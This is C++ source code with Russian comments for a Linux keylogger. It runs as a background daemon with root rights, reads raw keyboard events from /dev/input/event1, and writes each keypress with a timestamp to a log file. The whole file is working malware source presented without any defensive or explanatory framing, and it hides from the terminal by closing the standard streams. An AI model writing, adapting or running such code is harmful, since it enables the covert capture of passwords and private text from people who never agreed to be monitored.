#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <syslog.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/select.h>
#include <termios.h>
#include <signal.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sys/file.h>
#include <errno.h>

using namespace std;

bool isStart;

char *keycode[256] =
{
    "", "<esc>", "1", "2", "3", "4", "5", "6", "7", "8",
    "9", "0", "-", "=", "<backspace>", "<tab>", "q", "w", "e", "r",
    "t", "y", "u", "i", "o", "p", "[", "]", "<enter>", "<control>",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
    "'", "", "<shift>", "\\", "z", "x", "c", "v", "b", "n",
    "m", ",", ".", "/", "<shift>", "", "<alt>", "<space>", "<capslock>", "<f1>",
    "<f2>", "<f3>", "<f4>", "<f5>", "<f6>", "<f7>", "<f8>", "<f9>", "<f10>", "<numlock>",
    "<scrolllock>", "", "", "", "", "", "", "", "", "",
    "", "\\", "f11", "f12", "", "", "", "", "", "",
    "", "", "<control>", "", "<sysrq>"
};

void writeLog(char msg[256]);
char* getTime();
bool daemonPreparation();

void readKeys (int _fileDescriptor, char *keys[])
{
  struct input_event inputEvent[64];
  int rd, value, size = sizeof (struct input_event);

  while (true)
  {
    rd = read (_fileDescriptor, inputEvent, size * 64);
    for (int i = 0; i < rd / sizeof(struct input_event); i++)
    {
      if (inputEvent[i].type == 1 && inputEvent[i].value == 1)
      {
            if(keys[inputEvent[i].code] != NULL)
            {
                writeLog(keys[inputEvent[i].code]);
            }
      }
    }
  }
}

bool daemonPreparation()
{
    int pid_file = open("/var/run/demon.pid", O_CREAT | O_RDWR, 0666);
    int rc = flock(pid_file, LOCK_EX | LOCK_NB);
    if(rc == 0)
    {
        /* Наши ID процесса и сессии */
        pid_t pid, sid;

        /* Ответвляемся от родительского процесса */
        pid = fork ();
        if (pid < 0)
        {
            exit (EXIT_FAILURE);
        }
        /* Если с PID'ом все получилось, то родительский процесс можно завершить. */
        if (pid > 0)
        {
            exit (EXIT_SUCCESS);
        }
        /* Изменяем файловую маску */
        umask (0);

        /* Создание нового SID для дочернего процесса */
        sid = setsid ();
        if (sid < 0)
        {
            exit (EXIT_FAILURE);
        }

        if((chdir("/")) < 0)
        {
            //выходим в корень фс
            exit(1);
        }

        close(STDIN_FILENO);//закрываем доступ к стандартным потокам ввода-вывода
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        return true;
    }
    return false;


}

void writeLog(char pressedButton[256])
{
    fstream logFile("daemon.log", fstream::app|fstream::out);
    if(logFile != NULL && pressedButton != NULL)
    {
        char toLog[312];
        if(strcmp(pressedButton, "<space>") == 0 || isStart == true)
        {
            isStart = false;
            strcpy(toLog, "\n");
            strcat(toLog, getTime());
            strcat(toLog, " || ");
            if(strcmp(pressedButton, "<space>") != 0)
            {
                strcat(toLog, pressedButton);
            }
        }
        else
        {
            strcpy(toLog, pressedButton);
        }
        logFile << toLog;
    }
    logFile.close();
}

char* getTime()
{
    time_t now;
    static char tbuf[64];
    bzero(tbuf,64);
    time(&now);
    struct tm *ptr;
    ptr = localtime(&now);
    strftime(tbuf,64, "%d-%m-%Y %H:%M:%S", ptr);
    return tbuf;
}

int main()
{
    if(daemonPreparation() == true)
    {
        isStart = true;
        keycode[125] = "<win>";

        //указываем на то, что будем следить за клавиатурой
        char *device = "/dev/input/event1";

        //программу нужно запускать от sudo. тогда все будет работать
        if ((getuid ()) == 0)
        {
            int fileDescriptor = open (device, O_RDONLY);//открываем только для чтения
            char name[256] = "Unknown";
            ioctl (fileDescriptor, EVIOCGNAME (sizeof (name)), name);
            readKeys (fileDescriptor, keycode);
        }
    }
    return 0;
}
